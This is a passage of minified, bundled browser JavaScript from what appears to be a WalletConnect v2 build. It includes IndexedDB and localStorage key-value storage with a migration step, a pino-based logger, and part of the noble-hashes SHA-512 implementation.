e.unwatch&&((d=(h=e.unwatch)[u])==null||d.call(h),delete e.unwatch[u]),l&&await Ew(e.mounts[u]),e.mountpoints=e.mountpoints.filter(g=>g!==u),delete e.mounts[u])},getMount(u=""){u=cn(u)+":";const l=r(u);return{driver:l.driver,base:l.base}},getMounts(u="",l={}){return u=cn(u),n(u,l.parents).map(d=>({driver:d.driver,base:d.mountpoint}))},keys:(u,l={})=>c.getKeys(u,l),get:(u,l={})=>c.getItem(u,l),set:(u,l,h={})=>c.setItem(u,l,h),has:(u,l={})=>c.hasItem(u,l),del:(u,l={})=>c.removeItem(u,l),remove:(u,l={})=>c.removeItem(u,l)};return c}function vw(t,e,r){return t.watch?t.watch((n,i)=>e(n,r+i)):()=>{}}async function Ew(t){typeof t.dispose=="function"&&await yr(t.dispose)}function va(t){return new Promise((e,r)=>{t.oncomplete=t.onsuccess=()=>e(t.result),t.onabort=t.onerror=()=>r(t.error)})}function D1(t,e){const r=indexedDB.open(t);r.onupgradeneeded=()=>r.result.createObjectStore(e);const n=va(r);return(i,s)=>n.then(o=>s(o.transaction(e,i).objectStore(e)))}let Op;function Gl(){return Op||(Op=D1("keyval-store","keyval")),Op}function Aw(t,e=Gl()){return e("readonly",r=>va(r.get(t)))}function BN(t,e,r=Gl()){return r("readwrite",n=>(n.put(e,t),va(n.transaction)))}function UN(t,e=Gl()){return e("readwrite",r=>(r.delete(t),va(r.transaction)))}function $N(t=Gl()){return t("readwrite",e=>(e.clear(),va(e.transaction)))}function LN(t,e){return t.openCursor().onsuccess=function(){this.result&&(e(this.result),this.result.continue())},va(t.transaction)}function FN(t=Gl()){return t("readonly",e=>{if(e.getAllKeys)return va(e.getAllKeys());const r=[];return LN(e,n=>r.push(n.key)).then(()=>r)})}const jN=t=>JSON.stringify(t,(e,r)=>typeof r=="bigint"?r.toString()+"n":r),qN=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,r=t.replace(e,'$1"$2n"$3');return JSON.parse(r,(n,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function Zo(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return qN(t)}catch{return t}}function ys(t){return typeof t=="string"?t:jN(t)||""}const zN="idb-keyval";var HN=(t={})=>{const e=t.base&&t.base.length>0?`${t.base}:`:"",r=i=>e+i;let n;return t.dbName&&t.storeName&&(n=D1(t.dbName,t.storeName)),{name:zN,options:t,async hasItem(i){return!(typeof await Aw(r(i),n)>"u")},async getItem(i){return await Aw(r(i),n)??null},setItem(i,s){return BN(r(i),s,n)},removeItem(i){return UN(r(i),n)},getKeys(){return FN(n)},clear(){return $N(n)}}};const WN="WALLET_CONNECT_V2_INDEXED_DB",GN="keyvaluestorage";let VN=class{constructor(){this.indexedDb=MN({driver:HN({dbName:WN,storeName:GN})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e=>[e.key,e.value])}async getItem(e){const r=await this.indexedDb.getItem(e);if(r!==null)return r}async setItem(e,r){await this.indexedDb.setItem(e,ys(r))}async removeItem(e){await this.indexedDb.removeItem(e)}};var kp=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},nd={exports:{}};(function(){let t;function e(){}t=e,t.prototype.getItem=function(r){return this.hasOwnProperty(r)?String(this[r]):null},t.prototype.setItem=function(r,n){this[r]=String(n)},t.prototype.removeItem=function(r){delete this[r]},t.prototype.clear=function(){const r=this;Object.keys(r).forEach(function(n){r[n]=void 0,delete r[n]})},t.prototype.key=function(r){return r=r||0,Object.keys(this)[r]},t.prototype.__defineGetter__("length",function(){return Object.keys(this).length}),typeof kp<"u"&&kp.localStorage?nd.exports=kp.localStorage:typeof window<"u"&&window.localStorage?nd.exports=window.localStorage:nd.exports=new e})();function KN(t){var e;return[t[0],Zo((e=t[1])!=null?e:"")]}let QN=class{constructor(){this.localStorage=nd.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(KN)}async getItem(e){const r=this.localStorage.getItem(e);if(r!==null)return Zo(r)}async setItem(e,r){this.localStorage.setItem(e,ys(r))}async removeItem(e){this.localStorage.removeItem(e)}};const YN="wc_storage_version",_w=1,JN=async(t,e,r)=>{const n=YN,i=await e.getItem(n);if(i&&i>=_w){r(e);return}const s=await t.getKeys();if(!s.length){r(e);return}const o=[];for(;s.length;){const a=s.shift();if(!a)continue;const c=a.toLowerCase();if(c.includes("wc@")||c.includes("walletconnect")||c.includes("wc_")||c.includes("wallet_connect")){const u=await t.getItem(a);await e.setItem(a,u),o.push(a)}}await e.setItem(n,_w),r(e),ZN(t,o)},ZN=async(t,e)=>{e.length&&e.forEach(async r=>{await t.removeItem(r)})};let XN=class{constructor(){this.initialized=!1,this.setInitialized=r=>{this.storage=r,this.initialized=!0};const e=new QN;this.storage=e;try{const r=new VN;JN(e,r,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,r){return await this.initialize(),this.storage.setItem(e,r)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise(e=>{const r=setInterval(()=>{this.initialized&&(clearInterval(r),e())},20)})}};var Dp,Cw;function eT(){if(Cw)return Dp;Cw=1;function t(r){try{return JSON.stringify(r)}catch{return'"[Circular]"'}}Dp=e;function e(r,n,i){var s=i&&i.stringify||t,o=1;if(typeof r=="object"&&r!==null){var a=n.length+o;if(a===1)return r;var c=new Array(a);c[0]=s(r);for(var u=1;u<a;u++)c[u]=s(n[u]);return c.join(" ")}if(typeof r!="string")return r;var l=n.length;if(l===0)return r;for(var h="",d=1-o,g=-1,y=r&&r.length||0,m=0;m<y;){if(r.charCodeAt(m)===37&&m+1<y){switch(g=g>-1?g:0,r.charCodeAt(m+1)){case 100:case 102:if(d>=l||n[d]==null)break;g<m&&(h+=r.slice(g,m)),h+=Number(n[d]),g=m+2,m++;break;case 105:if(d>=l||n[d]==null)break;g<m&&(h+=r.slice(g,m)),h+=Math.floor(Number(n[d])),g=m+2,m++;break;case 79:case 111:case 106:if(d>=l||n[d]===void 0)break;g<m&&(h+=r.slice(g,m));var b=typeof n[d];if(b==="string"){h+="'"+n[d]+"'",g=m+2,m++;break}if(b==="function"){h+=n[d].name||"<anonymous>",g=m+2,m++;break}h+=s(n[d]),g=m+2,m++;break;case 115:if(d>=l)break;g<m&&(h+=r.slice(g,m)),h+=String(n[d]),g=m+2,m++;break;case 37:g<m&&(h+=r.slice(g,m)),h+="%",g=m+2,m++,d--;break}++d}++m}return g===-1?r:(g<y&&(h+=r.slice(g)),h)}return Dp}var Mp,Iw;function tT(){if(Iw)return Mp;Iw=1;const t=eT();Mp=i;const e=S().console||{},r={mapHttpRequest:y,mapHttpResponse:y,wrapRequestSerializer:m,wrapResponseSerializer:m,wrapErrorSerializer:m,req:y,res:y,err:d};function n(C,O){return Array.isArray(C)?C.filter(function(D){return D!=="!stdSerializers.err"}):C===!0?Object.keys(O):!1}function i(C){C=C||{},C.browser=C.browser||{};const O=C.browser.transmit;if(O&&typeof O.send!="function")throw Error("pino: transmit option must have a send function");const $=C.browser.write||e;C.browser.write&&(C.browser.asObject=!0);const D=C.serializers||{},F=n(C.browser.serialize,D);let j=C.browser.serialize;Array.isArray(C.browser.serialize)&&C.browser.serialize.indexOf("!stdSerializers.err")>-1&&(j=!1);const L=["error","fatal","warn","info","debug","trace"];typeof $=="function"&&($.error=$.fatal=$.warn=$.info=$.debug=$.trace=$),C.enabled===!1&&(C.level="silent");const N=C.level||"info",f=Object.create($);f.log||(f.log=b),Object.defineProperty(f,"levelVal",{get:w}),Object.defineProperty(f,"level",{get:E,set:x});const p={transmit:O,serialize:F,asObject:C.browser.asObject,levels:L,timestamp:g(C)};f.levels=i.levels,f.level=N,f.setMaxListeners=f.getMaxListeners=f.emit=f.addListener=f.on=f.prependListener=f.once=f.prependOnceListener=f.removeListener=f.removeAllListeners=f.listeners=f.listenerCount=f.eventNames=f.write=f.flush=b,f.serializers=D,f._serialize=F,f._stdErrSerialize=j,f.child=R,O&&(f._logEvent=h());function w(){return this.level==="silent"?1/0:this.levels.values[this.level]}function E(){return this._level}function x(B){if(B!=="silent"&&!this.levels.values[B])throw Error("unknown level "+B);this._level=B,s(p,f,"error","log"),s(p,f,"fatal","error"),s(p,f,"warn","error"),s(p,f,"info","log"),s(p,f,"debug","log"),s(p,f,"trace","log")}function R(B,k){if(!B)throw new Error("missing bindings for child Pino");k=k||{},F&&B.serializers&&(k.serializers=B.serializers);const v=k.serializers;if(F&&v){var M=Object.assign({},D,v),V=C.browser.serialize===!0?Object.keys(M):F;delete B.serializers,c([B],V,M,this._stdErrSerialize)}function I(z){this._childLevel=(z._childLevel|0)+1,this.error=u(z,B,"error"),this.fatal=u(z,B,"fatal"),this.warn=u(z,B,"warn"),this.info=u(z,B,"info"),this.debug=u(z,B,"debug"),this.trace=u(z,B,"trace"),M&&(this.serializers=M,this._serialize=V),O&&(this._logEvent=h([].concat(z._logEvent.bindings,B)))}return I.prototype=this,new I(this)}return f}i.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},i.stdSerializers=r,i.stdTimeFunctions=Object.assign({},{nullTime:A,epochTime:_,unixTime:T,isoTime:P});function s(C,O,$,D){const F=Object.getPrototypeOf(O);O[$]=O.levelVal>O.levels.values[$]?b:F[$]?F[$]:e[$]||e[D]||b,o(C,O,$)}function o(C,O,$){!C.transmit&&O[$]===b||(O[$]=function(D){return function(){const j=C.timestamp(),L=new Array(arguments.length),N=Object.getPrototypeOf&&Object.getPrototypeOf(this)===e?e:this;for(var f=0;f<L.length;f++)L[f]=arguments[f];if(C.serialize&&!C.asObject&&c(L,this._serialize,this.serializers,this._stdErrSerialize),C.asObject?D.call(N,a(this,$,L,j)):D.apply(N,L),C.transmit){const p=C.transmit.level||O.level,w=i.levels.values[p],E=i.levels.values[$];if(E<w)return;l(this,{ts:j,methodLevel:$,methodValue:E,transmitValue:i.levels.values[C.transmit.level||O.level],send:C.transmit.send,val:O.levelVal},L)}}}(O[$]))}function a(C,O,$,D){C._serialize&&c($,C._serialize,C.serializers,C._stdErrSerialize);const F=$.slice();let j=F[0];const L={};D&&(L.time=D),L.level=i.levels.values[O];let N=(C._childLevel|0)+1;if(N<1&&(N=1),j!==null&&typeof j=="object"){for(;N--&&typeof F[0]=="object";)Object.assign(L,F.shift());j=F.length?t(F.shift(),F):void 0}else typeof j=="string"&&(j=t(F.shift(),F));return j!==void 0&&(L.msg=j),L}function c(C,O,$,D){for(const F in C)if(D&&C[F]instanceof Error)C[F]=i.stdSerializers.err(C[F]);else if(typeof C[F]=="object"&&!Array.isArray(C[F]))for(const j in C[F])O&&O.indexOf(j)>-1&&j in $&&(C[F][j]=$[j](C[F][j]))}function u(C,O,$){return function(){const D=new Array(1+arguments.length);D[0]=O;for(var F=1;F<D.length;F++)D[F]=arguments[F-1];return C[$].apply(this,D)}}function l(C,O,$){const D=O.send,F=O.ts,j=O.methodLevel,L=O.methodValue,N=O.val,f=C._logEvent.bindings;c($,C._serialize||Object.keys(C.serializers),C.serializers,C._stdErrSerialize===void 0?!0:C._stdErrSerialize),C._logEvent.ts=F,C._logEvent.messages=$.filter(function(p){return f.indexOf(p)===-1}),C._logEvent.level.label=j,C._logEvent.level.value=L,D(j,C._logEvent,N),C._logEvent=h(f)}function h(C){return{ts:0,messages:[],bindings:C||[],level:{label:"",value:0}}}function d(C){const O={type:C.constructor.name,msg:C.message,stack:C.stack};for(const $ in C)O[$]===void 0&&(O[$]=C[$]);return O}function g(C){return typeof C.timestamp=="function"?C.timestamp:C.timestamp===!1?A:_}function y(){return{}}function m(C){return C}function b(){}function A(){return!1}function _(){return Date.now()}function T(){return Math.round(Date.now()/1e3)}function P(){return new Date(Date.now()).toISOString()}function S(){function C(O){return typeof O<"u"&&O}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return C(self)||C(window)||C(this)||{}}}return Mp}var Va=tT();const Vl=co(Va),rT={level:"info"},Kl="custom_context",W0=1e3*1024;let nT=class{constructor(e){this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return this.sizeInBytes}},xw=class{constructor(e){this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const r=new nT(e);if(r.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${r.size}`);for(;this.size+r.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=r),this.tail=r):(this.head=r,this.tail=r),this.lengthInNodes++,this.sizeInBytes+=r.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let r=this.head;for(;r!==null;)e.push(r.value),r=r.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const r=e.value;return e=e.next,{done:!1,value:r}}}}},M1=class{constructor(e,r=W0){this.level=e??"error",this.levelValue=Va.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=r,this.logs=new xw(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,r){r===Va.levels.values.error?console.error(e):r===Va.levels.values.warn?console.warn(e):r===Va.levels.values.debug?console.debug(e):r===Va.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(ys({timestamp:new Date().toISOString(),log:e}));const r=typeof e=="string"?JSON.parse(e).level:e.level;r>=this.levelValue&&this.forwardToConsole(e,r)}getLogs(){return this.logs}clearLogs(){this.logs=new xw(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const r=this.getLogArray();return r.push(ys({extraMetadata:e})),new Blob(r,{type:"application/json"})}},iT=class{constructor(e,r=W0){this.baseChunkLogger=new M1(e,r)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const r=URL.createObjectURL(this.logsToBlob(e)),n=document.createElement("a");n.href=r,n.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(r)}},sT=class{constructor(e,r=W0){this.baseChunkLogger=new M1(e,r)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}};var oT=Object.defineProperty,aT=Object.defineProperties,cT=Object.getOwnPropertyDescriptors,Sw=Object.getOwnPropertySymbols,uT=Object.prototype.hasOwnProperty,lT=Object.prototype.propertyIsEnumerable,Nw=(t,e,r)=>e in t?oT(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Sd=(t,e)=>{for(var r in e||(e={}))uT.call(e,r)&&Nw(t,r,e[r]);if(Sw)for(var r of Sw(e))lT.call(e,r)&&Nw(t,r,e[r]);return t},Nd=(t,e)=>aT(t,cT(e));function Dc(t){return Nd(Sd({},t),{level:(t==null?void 0:t.level)||rT.level})}function hT(t,e=Kl){return t[e]||""}function dT(t,e,r=Kl){return t[r]=e,t}function gn(t,e=Kl){let r="";return typeof t.bindings>"u"?r=hT(t,e):r=t.bindings().context||"",r}function fT(t,e,r=Kl){const n=gn(t,r);return n.trim()?`${n}/${e}`:e}function Gr(t,e,r=Kl){const n=fT(t,e,r),i=t.child({context:n});return dT(i,n,r)}function pT(t){var e,r;const n=new iT((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Vl(Nd(Sd({},t.opts),{level:"trace",browser:Nd(Sd({},(r=t.opts)==null?void 0:r.browser),{write:i=>n.write(i)})})),chunkLoggerController:n}}function gT(t){var e;const r=new sT((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Vl(Nd(Sd({},t.opts),{level:"trace"}),r),chunkLoggerController:r}}function G0(t){return typeof t.loggerOverride<"u"&&typeof t.loggerOverride!="string"?{logger:t.loggerOverride,chunkLoggerController:null}:typeof window<"u"?pT(t):gT(t)}var mT=Object.defineProperty,yT=(t,e,r)=>e in t?mT(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Tw=(t,e,r)=>yT(t,typeof e!="symbol"?e+"":e,r);let wT=class extends ba{constructor(e){super(),this.opts=e,Tw(this,"protocol","wc"),Tw(this,"version",2)}};var bT=Object.defineProperty,vT=(t,e,r)=>e in t?bT(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ET=(t,e,r)=>vT(t,e+"",r);let AT=class extends ba{constructor(e,r){super(),this.core=e,this.logger=r,ET(this,"records",new Map)}},_T=class{constructor(e,r){this.logger=e,this.core=r}},CT=class extends ba{constructor(e,r){super(),this.relayer=e,this.logger=r}},IT=class extends ba{constructor(e){super()}},xT=class{constructor(e,r,n,i){this.core=e,this.logger=r,this.name=n}},ST=class extends ba{constructor(e,r){super(),this.relayer=e,this.logger=r}},NT=class extends ba{constructor(e,r){super(),this.core=e,this.logger=r}},TT=class{constructor(e,r,n){this.core=e,this.logger=r,this.store=n}},PT=class{constructor(e,r){this.projectId=e,this.logger=r}},RT=class{constructor(e,r,n){this.core=e,this.logger=r,this.telemetryEnabled=n}};var OT=Object.defineProperty,kT=(t,e,r)=>e in t?OT(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Pw=(t,e,r)=>kT(t,typeof e!="symbol"?e+"":e,r);let DT=class{constructor(e){this.opts=e,Pw(this,"protocol","wc"),Pw(this,"version",2)}},MT=class{constructor(e){this.client=e}};function BT(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function B1(t,...e){if(!BT(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function Rw(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function UT(t,e){B1(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const Ia=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Bp=t=>new DataView(t.buffer,t.byteOffset,t.byteLength);function $T(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function U1(t){return typeof t=="string"&&(t=$T(t)),B1(t),t}let LT=class{clone(){return this._cloneInto()}};function FT(t){const e=n=>t().update(U1(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function $1(t=32){if(Ia&&typeof Ia.getRandomValues=="function")return Ia.getRandomValues(new Uint8Array(t));if(Ia&&typeof Ia.randomBytes=="function")return Ia.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}function jT(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,u=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+u,a,n)}let qT=class extends LT{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Bp(this.buffer)}update(e){Rw(this);const{view:r,buffer:n,blockLen:i}=this;e=U1(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=Bp(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Rw(this),UT(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;jT(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=Bp(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const u=c/4,l=this.get();if(u>l.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<u;h++)a.setUint32(4*h,l[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}};const Sh=BigInt(2**32-1),ym=BigInt(32);function L1(t,e=!1){return e?{h:Number(t&Sh),l:Number(t>>ym&Sh)}:{h:Number(t>>ym&Sh)|0,l:Number(t&Sh)|0}}function zT(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=L1(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const HT=(t,e)=>BigInt(t>>>0)<<ym|BigInt(e>>>0),WT=(t,e,r)=>t>>>r,GT=(t,e,r)=>t<<32-r|e>>>r,VT=(t,e,r)=>t>>>r|e<<32-r,KT=(t,e,r)=>t<<32-r|e>>>r,QT=(t,e,r)=>t<<64-r|e>>>r-32,YT=(t,e,r)=>t>>>r-32|e<<64-r,JT=(t,e)=>e,ZT=(t,e)=>t,XT=(t,e,r)=>t<<r|e>>>32-r,eP=(t,e,r)=>e<<r|t>>>32-r,tP=(t,e,r)=>e<<r-32|t>>>64-r,rP=(t,e,r)=>t<<r-32|e>>>64-r;function nP(t,e,r,n){const i=(e>>>0)+(n>>>0);return{h:t+r+(i/2**32|0)|0,l:i|0}}const iP=(t,e,r)=>(t>>>0)+(e>>>0)+(r>>>0),sP=(t,e,r,n)=>e+r+n+(t/2**32|0)|0,oP=(t,e,r,n)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0),aP=(t,e,r,n,i)=>e+r+n+i+(t/2**32|0)|0,cP=(t,e,r,n,i)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0)+(i>>>0),uP=(t,e,r,n,i,s)=>e+r+n+i+s+(t/2**32|0)|0,De={fromBig:L1,split:zT,toBig:HT,shrSH:WT,shrSL:GT,rotrSH:VT,rotrSL:KT,rotrBH:QT,rotrBL:YT,rotr32H:JT,rotr32L:ZT,rotlSH:XT,rotlSL:eP,rotlBH:tP,rotlBL:rP,add:nP,add3L:iP,add3H:sP,add4L:oP,add4H:aP,add5H:uP,add5L:cP},[lP,hP]=De.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),Os=new Uint32Array(80),ks=new Uint32Array(80);let dP=class extends qT{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:r,Bh:n,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:u,El:l,Fh:h,Fl:d,Gh:g,Gl:y,Hh:m,Hl:b}=this;return[e,r,n,i,s,o,a,c,u,l,h,d,g,y,m,b]}set(e,r,n,i,s,o,a,c,u,l,h,d,g,y,m,b){this.Ah=e|0,this.Al=r|0,this.Bh=n|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=u|0,this.El=l|0,this.Fh=h|0,this.Fl=d|0,this.Gh=g|0,this.Gl=y|0,this.Hh=m|0,this.Hl=b|0}process(e,r){for(let T=0;T<16;T++,r+=4)Os[T]=e.getUint32(r),ks[T]=e.getUint32(r+=4);for(let T=16;T<80;T++){const P=Os[T-15]|0,S=ks[T-15]|0,C=De.rotrSH(P,S,1)^De.rotrSH(P,S,8)^De.shrSH(P,S,7),O=De.rotrSL(P,S,1)^De.rotrSL(P,S,8)^De.shrSL(P,S,7),$=Os[T-2]|0,D=ks[T-2]|0,F=De.rotrSH($,D,19)^De.rotrBH($,D,61)^De.shrSH($,D,6),j=De.rotrSL($,D,19)^De.rotrBL($,D,61)^De.shrSL($,D,6),L=De.add4L(O,j,ks[T-7],ks[T-16]),N=De.add4H(L,C,F,Os[T-7],Os[T-16]);Os[T]=N|0,ks[T]=L|0}let{Ah:n,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:u,Dl:l,Eh:h,El:d,Fh:g,Fl:y,Gh:m,Gl:b,Hh:A,Hl:_}=this;for(let T=0;T<80;T++){const P=De.rotrSH(h,d,14)^De.rotrSH(h,d,18)^De.rotrBH(h,d,41),S=De.rotrSL(h,d,14)^De.rotrSL(h,d,18)^De.rotrBL(h,d,41),C=h&g^~h&m,O=d&y^~d&b,$=De.add5L(_,S,O,hP[T],ks[T]),D=De.add5H($,A,P,C,lP[T],Os[T]),F=$|0,j=De.rotrSH(n,i,28)^De.rotrBH(n,i,34)^De.rotrBH(n,i,39),L=De.rotrSL(n,i,28)^De.rotrBL(n,i,34)^De.rotrBL(n,i,39),N=n&s^n&a^s&a,f=i&o^i&c^o&c;A=m|0,_=b|0,m=g|0,b=y|0,g=h|0,y=d|0,{h,l:d}=De.add(u|0,l|0,D|0,F|0),u=a|0,l=c|0,a=s|0,c=o|0,s=n|0,o=i|0;const 